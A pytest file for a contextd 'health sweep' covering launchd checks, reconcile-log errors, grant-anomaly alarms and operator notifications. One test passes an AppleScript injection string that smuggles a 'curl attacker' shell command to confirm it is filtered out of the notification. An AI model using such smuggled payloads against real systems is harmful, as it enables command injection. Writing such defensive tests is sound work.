"""The health sweep: senses for the machinery, alarm path exercised.

Pins the properties docs/AGENTS.md stage 1 promises: verdicts land as
content-NULL schema-closed events, degradations are detected from real
local state, the operator is interrupted only for NEW degradations, the
notification speaks only fixed check names, and a check that cannot run
here reads unknown, never degraded.
"""

import json
from pathlib import Path

from contextd import load_config
from contextd.db import connect
from hooks import health_sweep


def _sweep(conn, **kwargs):
    return health_sweep.run_sweep(conn, load_config(), **kwargs)


def test_sweep_lands_one_schema_valid_content_null_event():
    conn = connect()
    meta = _sweep(conn, launchctl_output=None)
    row = conn.execute(
        "SELECT content, meta FROM events WHERE source='health' "
        "AND kind='sweep'").fetchone()
    assert row is not None and row["content"] is None
    stored = json.loads(row["meta"])
    assert stored["verdict"] == meta["verdict"]
    assert set(stored["checks"]) == set(health_sweep.CHECK_NAMES)
    # launchctl unavailable is unknown, not degraded
    assert stored["checks"]["launchd"]["state"] == "unknown"
    assert "launchd" not in stored["degraded"]


def test_new_degradation_detected_once_then_becomes_known(tmp_path):
    conn = connect()
    plists = tmp_path / "agents"
    plists.mkdir()
    (plists / "com.contextd.watch.plist").write_text("<plist/>")

    healthy = "1\t0\tcom.contextd.watch"
    broken = "-\t78\tcom.contextd.watch"
    # running now with a nonzero LAST exit (a deliberate kickstart) is ok
    kicked = "16037\t-15\tcom.contextd.watch"
    assert health_sweep.check_launchd(
        plists, kicked)["state"] == "ok"

    first = _sweep(conn, launchctl_output=healthy, plist_dir=plists)
    assert "launchd" not in first["degraded"]

    second = _sweep(conn, launchctl_output=broken, plist_dir=plists)
    assert "launchd" in second["degraded"]
    assert "launchd" in second["new_degradations"]

    third = _sweep(conn, launchctl_output=broken, plist_dir=plists)
    assert "launchd" in third["degraded"]
    assert third["new_degradations"] == []  # still broken, but not news


def test_unloaded_installed_agent_degrades(tmp_path):
    conn = connect()
    plists = tmp_path / "agents"
    plists.mkdir()
    (plists / "com.contextd.reconcile.plist").write_text("<plist/>")
    meta = _sweep(conn, launchctl_output="1\t0\tcom.example.other",
                  plist_dir=plists)
    assert "launchd" in meta["degraded"]
    assert "not loaded" in meta["checks"]["launchd"]["detail"]


def test_repeating_reconcile_failure_is_named(tmp_path):
    log = tmp_path / "reconcile.log"
    refusal = ("contextd.db.SchemaMigrationRequired: schema 1; "
               "this build requires 2.")
    log.write_text("\n".join(["Traceback (most recent call last):", refusal] * 5))
    check = health_sweep.check_reconcile_errors(log)
    assert check["state"] == "degraded"
    assert "SchemaMigrationRequired" in check["detail"]

    log.write_text('{"epoch": 1, "notes": 2}\n')
    assert health_sweep.check_reconcile_errors(log)["state"] == "ok"

    # a historical streak followed by successful runs is cured, not repeating
    log.write_text("\n".join([refusal] * 5 + ['{"epoch": 9, "notes": 1}']))
    assert health_sweep.check_reconcile_errors(log)["state"] == "ok"
    assert health_sweep.check_reconcile_errors(
        tmp_path / "missing.log")["state"] == "unknown"


def test_notification_fires_only_on_new_and_speaks_only_check_names(monkeypatch):
    calls = []
    monkeypatch.setattr(
        health_sweep.subprocess, "run",
        lambda argv, **kw: calls.append(argv) or None,
    )
    health_sweep.notify([], enabled=True)
    health_sweep.notify(["launchd"], enabled=False)
    assert calls == []

    # injected free text must never reach the notification command
    health_sweep.notify(
        ["launchd", 'evil"; do shell script "curl attacker"'], enabled=True)
    assert len(calls) == 1
    joined = " ".join(calls[0])
    assert "launchd" in joined and "attacker" not in joined


def test_grant_anomaly_regression_alarms_only_on_increase():
    conn = connect()
    baseline = health_sweep.check_grant_anomalies(conn, previous_count=None)
    assert baseline["state"] == "ok"
    same = health_sweep.check_grant_anomalies(conn, baseline["count"])
    assert same["state"] == "ok"
    # a lower prior watermark means anomalies appeared since the last
    # sweep; -1 forces the increase branch even on a pristine archive
    grew = health_sweep.check_grant_anomalies(conn, previous_count=-1)
    assert grew["state"] == "degraded"
    assert "new anomaly" in grew["detail"]


def test_plist_template_carries_placeholders():
    template = Path(__file__).resolve().parent.parent / "launchd" \
        / "com.contextd.health.plist"
    text = template.read_text()
    assert "__CONTEXTD_REPO__" in text and "__CONTEXTD_ARCHIVE__" in text
